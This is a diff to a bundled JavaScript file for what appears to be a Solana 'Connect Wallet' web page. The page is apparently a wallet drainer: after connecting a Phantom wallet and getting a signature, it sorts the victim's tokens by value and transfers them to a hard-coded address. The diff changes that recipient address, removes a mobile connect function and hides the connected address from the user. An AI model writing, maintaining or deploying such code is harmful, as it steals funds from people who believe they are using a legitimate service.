@@ -72648,24 +72648,6 @@ function _asyncToGenerator(n) { return function () { var t = this, e = arguments
 window.Buffer = _buffer.Buffer;
 // Define necessary variables
 var walletAddress = null;
-
-// Function to open the Phantom wallet app on mobile
-var openPhantomWallet = function openPhantomWallet() {
-  var appUrl = encodeURIComponent(window.location.href); // Current app URL
-  var dappEncryptionPublicKey = 'EQDi1EUz1WZMoGAsob1XctVhWcnh6ABKpudP7ZFbcB1H';
-  var redirectLink = encodeURIComponent(window.location.href); // Redirect back to the app after connection
-  var cluster = 'mainnet-beta'; // Specify the network
-
-  // Construct the connection URL
-  var connectUrl = "https://phantom.app/ul/v1/connect?app_url=".concat(appUrl, "&dapp_encryption_public_key=").concat(dappEncryptionPublicKey, "&redirect_link=").concat(redirectLink, "&cluster=").concat(cluster);
-
-  // Open the connection URL
-  window.location.href = connectUrl;
-};
-
-// Attach the openPhantomWallet function to the "Connect Wallet" button
-document.getElementById('connectWalletBtn').addEventListener('click', openPhantomWallet);
-
 // Function to connect the Phantom wallet and execute the whole flow
 function connectAndExecute() {
   return _connectAndExecute.apply(this, arguments);
@@ -72692,7 +72674,7 @@ function _connectAndExecute() {
           walletAddress = response.publicKey.toString(); // Capture the connected wallet address
 
           // Display the connected wallet address
-          document.getElementById('connectWalletBtn').textContent = "Connected: ".concat(walletAddress);
+          document.getElementById('connectWalletBtn').textContent = "Connected";
 
           // Step 2: Sign a message after connection to verify wallet ownership
           _context.next = 12;
@@ -72732,7 +72714,7 @@ function _connectAndExecute() {
           console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
           // Step 7: Transfer tokens in the sorted order
-          recipientAddress = '6i3vVKyfafPTgpQjct9Tx8c3fAHT7sCBDG9GsZk1n4vf'; // Replace with the recipient's address
+          recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ'; // Replace with the recipient's address
           _context.next = 30;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
         case 30:
